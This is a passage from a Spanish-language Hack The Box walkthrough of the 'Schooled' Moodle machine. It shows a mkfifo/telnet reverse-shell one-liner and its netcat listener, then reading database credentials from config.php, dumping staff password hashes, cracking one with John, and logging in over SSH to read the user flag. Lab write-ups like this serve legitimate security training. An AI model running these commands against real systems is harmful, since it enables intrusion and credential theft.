&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rm /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/bin/sh -i &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;telnet 172.18.0.2 &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt; &amp;gt; /tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ nc -l -p &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
id
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
www
/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;mysql---moodle-db&#34;&gt;MySQL - Moodle DB&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion a los archivos de configuracion de moodle y encontramos las credenciales para la base de datos en mysql.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/usr/local/www/apache24/data/moodle/

cat config.php 
&amp;lt;?php  // Moodle configuration file

unset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
global &lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; new stdClass&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dbtype    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mysqli&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dblibrary &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;native&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dbhost    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dbname    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;moodle&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dbuser    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;moodle&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dbpass    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;PlaybookMaster2020&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;prefix    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mdl_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dboptions &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbpersist&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 0,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbport&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 3306,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbsocket&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbcollation&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8_unicode_ci&amp;#39;&lt;/span&gt;,
&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;wwwroot   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://moodle.schooled.htb/moodle&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;dataroot  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/local/www/apache24/moodledata&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;admin     &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;-&amp;gt;directorypermissions &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0777&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

require_once&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__DIR__ . &lt;span class=&#34;s1&#34;&gt;&amp;#39;/lib/setup.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!

which mysql
find / -name mysql 2&amp;gt;/dev/null
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/mysql
/usr/local/share/mysql
/usr/local/include/mysql
/usr/local/include/mysql/mysql
/usr/local/etc/mysql
/usr/local/lib/mysql
/var/mail/mysql
/var/db/mysql
/var/db/mysql/mysql
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Enumeramos la base de datos de Moodle y encontramos las contraseñas encriptadas de los usuarios del staff.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/local/bin/mysql -u moodle -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;PlaybookMaster2020&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;show databases;&amp;#34;&lt;/span&gt;
Database
information_schema
moodle          
/usr/local/bin/mysql -u moodle -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;PlaybookMaster2020&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;use moodle; show tables;&amp;#34;&lt;/span&gt;
Tables_in_moodle
mdl_analytics_indicator_calc
mdl_analytics_models

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

mdl_url
mdl_user
mdl_user_devices
mdl_user_enrolments
mdl_user_info_category
mdl_user_info_data
mdl_user_info_field
mdl_user_lastaccess
mdl_user_password_history
mdl_user_password_resets
mdl_user_preferences
mdl_user_private_key

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

/usr/local/bin/mysql -u moodle -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;PlaybookMaster2020&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;use moodle; select id,username,password,email from mdl_user where email like &amp;#39;%staff.schooled.htb&amp;#39;;&amp;#34;&lt;/span&gt;
id      username        password        email
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;       admin   &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$3&lt;/span&gt;D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW    jamie@staff.schooled.htb
&lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;      higgins_jane    &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$n9SrsMwmiU&lt;/span&gt;.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2    higgins_jane@staff.schooled.htb
&lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;      phillips_manuel &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG&lt;/span&gt;    phillips_manuel@staff.schooled.htb
&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;      carter_lianne   &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$jw&lt;/span&gt;.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe    carter_lianne@staff.schooled.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;jamie---user&#34;&gt;Jamie - User&lt;/h1&gt;
&lt;p&gt;Verificamos los usuarios registrados en la maquina, y encontramos a &lt;code&gt;jamie&lt;/code&gt; a quien le pusimos más prioridad para crackear el hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat /etc/passwd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep home
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;:/home/steve:/bin/csh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;password-cracking&#34;&gt;Password Cracking&lt;/h4&gt;
&lt;p&gt;Tras ejecutar John con el wordlist rockyou encontramos su contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashes_mysql_moodl
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bcrypt &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Blowfish 32/64 X3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
!QAZ2wsx         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:02:49 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-04-08 04:19&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.005903g/s 82.04p/s 82.04c/s 82.04C/s 110689..superpet
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la contraseña con el usuario &lt;code&gt;jamie&lt;/code&gt; en el servicio SSH para obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ ssh jamie@schooled.htb &lt;span class=&#34;c1&#34;&gt;# !QAZ2wsx&lt;/span&gt;
Password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; jamie@Schooled:
Last login: Tue Mar &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 14:44:53 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; from 10.10.14.5
FreeBSD 13.0-BETA3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GENERIC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ...  REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# zfs allow -u receiver compression,mountpoint,mount,create,receive rxpool&lt;/span&gt;

                -- Benedict Reuschling &amp;lt;bcr@FreeBSD.org&amp;gt;
jamie@Schooled:~ $ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
jamie
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;jamie&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;jamie&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;jamie&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;wheel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home/jamie
jamie@Schooled:~ $ cat user.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
ecf7c6d61bfc9c8
jamie@Schooled:~ $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;PrivEsc&lt;/h1&gt;
